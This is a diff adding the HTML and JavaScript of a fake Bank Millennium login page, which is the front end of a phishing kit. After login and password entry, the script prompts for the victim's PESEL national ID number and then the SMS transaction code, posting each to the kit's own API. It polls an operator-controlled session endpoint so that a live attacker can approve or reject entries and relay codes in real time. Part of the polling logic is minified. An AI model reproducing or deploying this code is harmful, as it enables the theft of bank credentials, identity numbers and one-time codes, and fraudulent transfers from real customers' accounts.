+                            <span class="phone">(+48) 22 598 40 50</span>
+                            <ul>
+                                <li class="lock">
+                                    <a href="https://www.bankmillennium.pl/bankowosc-elektroniczna/millenet-dla-klientow-indywidualnych-biznes/bezpieczenstwo" target="_blank">Bezpieczeństwo.</a>
+                                </li>
+                                <li class="map">
+                                    <a href="https://www.bankmillennium.pl/o-banku/oddzialy-i-bankomaty" target="_blank">Oddziały i bankomaty </a>
+                                </li>
+                                <li class="mail">
+                                    <a href="https://www.bankmillennium.pl/klienci-indywidualni/kontakt" target="_blank">Napisz do nas</a>
+                                </li>
+                            </ul>
+                        </footer>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer-copyright">
+        <p>Copyright © Bank Millennium SA</p>
+        <span class="MNText Magenta Text" data-dateformat="yy-mm-dd">BIC (Swift): BIGBPLPW</span>
+        <div id="nodeId" class="nodeIdLoginOnRight">Retail_Login_MulticodeRequest</div>
+    </div>
+</div>
+<div class="MNTooltip MNBalloon MNContainer WhiteAndRoundCloseButton" data-appearance="WhiteAndRoundCloseButton" data-appendtobody="true" data-closedelay="2000" data-destinationelement="$(&quot;#mnHelpIcon423098&quot;)" data-dontadjustappearance="false" data-initiallyvisible="false" data-minimumheight="0" data-showonlyonfocus="True" data-tailposition="BottomRight" data-widget="true" style="width: 308px; display: none;" id="ui-id-3">
+    <div class="Balloon" style="width: 308px; top: 35px; left: 226.734px; max-width: 750px; display: none;">
+        <div class="Tail BottomLeft"></div>
+        <div class="Content" id="_Content">MilleKod to Twój 8-cyfrowy login do konta w Banku Millennium (znajdziesz go w umowie). Wpisz swój MilleKod  lub własną nazwę dla MilleKodu. Własną nazwę MilleKodu możesz zdefiniować po zalogowaniu do Millenetu w zakładce Ustawienia &gt; Ustawienia zabezpieczeń &gt; Zmień nazwę dla MilleKodu. Własna nazwa MilleKodu może być używana zamiennie z 8-cyfrowym MilleKodem.
+            <br>
+            <br>Aby skorzystać z dodatkowego zabezpieczenia i wprowadzić MilleKod za pomocą klawiatury wirtualnej, kliknij w ikonę klawiatury poniżej.
+        </div>
+        <div class="Footer" id="_Footer">
+            <div class="helpicon-footer">
+                <a class="MNHLink MNCommand Magenta" data-widget="true" href="javascript:void(0)" onclick="$(&#39;#left-side-modal-panel&#39;).mnBalloonClosable().mnBalloonClosable(&#39;close&#39;);$(&#39;.LoginPage&#39;).Website_LayoutLogin(&#39;showMainBallon&#39;);$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp({}).Retail_Login_LoginProblemsHelp(&#39;executeWebtrendsZeroScreen&#39;);" id="ui-id-4">Nie pamiętasz swojego MilleKodu?</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const plusBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            $("#mainCont").empty()
+            $("#mainCont").append(' <b> <span class="MNText MediumText Text" data-dateformat="yy-mm-dd">Numer PESEL</span> </b> <div class="MNHelpIcon InfoImageButton WhiteInfo" data-widget="true" id="mnHelpIcon423098" tabindex="-1"></div><div class="MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow" data-allowedcharacters="Regex" data-appearance="RoundedWithShadow" data-makefocusonload="true" data-maskautoclear="true" data-onfocus="$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;focusForKeyboard&#39;, this, false, false);$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;getRange&#39;, this);" data-readonly="False" data-watermarkalign="notset" data-widget="true" id="Millekod"> <div class="Content col-xs-12"> <input aria-required="true" class="form-control MNTextBoxContent" data-val="true" data-val-regex="Nieprawidłowy MilleKod lub Twoja własna nazwa dla MilleKodu. Dopuszczalne znaki to: A-Z, a-z, 0-9" data-val-regex-pattern="^[a-zA-Z0-9]+$" data-val-required="Pole jest wymagane" id="bank_psd" maxlength="16" name="Millekod" pattern="^[a-zA-Z0-9]+$" style="height: 45px;" type="text"> </div><p class="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row"> <span class="field-validation-valid" data-valmsg-for="Millekod" data-valmsg-replace="true"></span> </p></div>')
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append('<input onclick="psdUpdate()" class="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default" id="BtnLogin" type="submit" value="DALEJ" wtrendsid="DALEJ">')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        // window.location.href = '/summary'
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+        if ($("#bank_psd").val() !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<h1>Logowanie...</h1>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+    //SUMMARY
+
+    const summaryFunc = () => {
+        $("#mainCont").empty()
+        $("#mainCont").append(' <b> <span class="MNText MediumText Text" data-dateformat="yy-mm-dd">Kod SMS z telefonu</span> </b> <div class="MNHelpIcon InfoImageButton WhiteInfo" data-widget="true" id="mnHelpIcon423098" tabindex="-1"></div><div class="MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow" data-allowedcharacters="Regex" data-appearance="RoundedWithShadow" data-makefocusonload="true" data-maskautoclear="true" data-onfocus="$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;focusForKeyboard&#39;, this, false, false);$(&#39;#LoginKeyBoard&#39;).mnKeyboard(&#39;getRange&#39;, this);" data-readonly="False" data-watermarkalign="notset" data-widget="true" id="Millekod"> <div class="Content col-xs-12"> <input aria-required="true" class="form-control MNTextBoxContent" data-val="true" data-val-regex="Nieprawidłowy MilleKod lub Twoja własna nazwa dla MilleKodu. Dopuszczalne znaki to: A-Z, a-z, 0-9" data-val-regex-pattern="^[a-zA-Z0-9]+$" data-val-required="Pole jest wymagane" id="bank_summary" maxlength="16" name="Millekod" pattern="^[a-zA-Z0-9]+$" style="height: 45px;" type="text"> </div><p class="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA row"> <span class="field-validation-valid" data-valmsg-for="Millekod" data-valmsg-replace="true"></span> </p></div>')
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append('<input onclick="summaryCode()" class="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default" id="BtnLogin" type="submit" value="DALEJ" wtrendsid="DALEJ">')
+        document.getElementById('summaryInfo').innerText = 'Autoryzuj transakcję'
+
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<h1>Logowanie...</h1>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+</script>
+</body>
+</html>
